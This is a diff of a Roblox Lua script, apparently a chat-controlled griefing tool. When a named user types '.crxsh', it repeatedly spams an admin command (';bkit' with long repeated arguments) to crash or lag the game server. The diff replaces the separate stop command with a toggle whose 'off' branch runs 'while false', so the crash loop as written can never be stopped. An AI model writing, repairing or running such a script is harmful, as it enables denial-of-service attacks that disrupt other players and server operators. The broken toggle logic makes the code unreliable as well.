@@ -98,25 +98,27 @@ user_premium__001.Chatted:connect(function(cht)
 
 end)
 
-user_premium__001.Chatted:Connect(function(cht)
+local toggle = false
+
+user_premium__001.Chatted:connect(function(cht)
     if cht:match(".crxsh") then
-        if game.Players.LocalPlayer then
-        loopCrash = true
-            while loopCrash do
-                game.Players:Chat(";bkit rest rest rest rest rest rest rest rest rest rest rest rest rest rest rest rest rest rest rest rest rest rest rest rest rest rest rest rest rest rest rest rest rest rest rest rest rest rest rest rest rest rest rest rest rest rest rest rest rest rest rest rest rest rest rest rest rest rest rest rest rest rest rest rest rest rest rest rest rest rest rest rest rest rest rest rest rest rest rest rest rest rest rest rest rest rest rest rest rest rest rest rest rest rest rest rest rest rest rest rest")
+        if toggle then
+            toggle = false
+            while false do
+                game.Players:Chat(";bkit rest rest rest rest rest rest rest rest rest rest rest rest rest rest rest rest rest rest rest rest rest rest rest rest rest rest rest rest rest rest rest rest rest rest rest rest rest rest rest rest rest rest rest rest rest rest rest rest rest rest rest rest rest rest rest rest rest rest rest rest rest end")
+                wait(10)
+            end
+        else
+            toggle = true
+            while true do
+                game.Players:Chat(";bkit rest rest rest rest rest rest rest rest rest rest rest rest rest rest rest rest rest rest rest rest rest rest rest rest rest rest rest rest rest rest rest rest rest rest rest rest rest rest rest rest rest rest rest rest rest rest rest rest rest rest rest rest end")
                 wait(10)
             end
         end
     end
 end)
 
-user_premium__001.Chatted:Connect(function(cht)
-    if cht:match(".uncrxsh") then
-        if game.Players.LocalPlayer then
-     loopCrash = false
-            end
-        end
-end)
+
 
 user_premium__001.Chatted:connect(function(cht)
 	if cht:match(".cmds") then
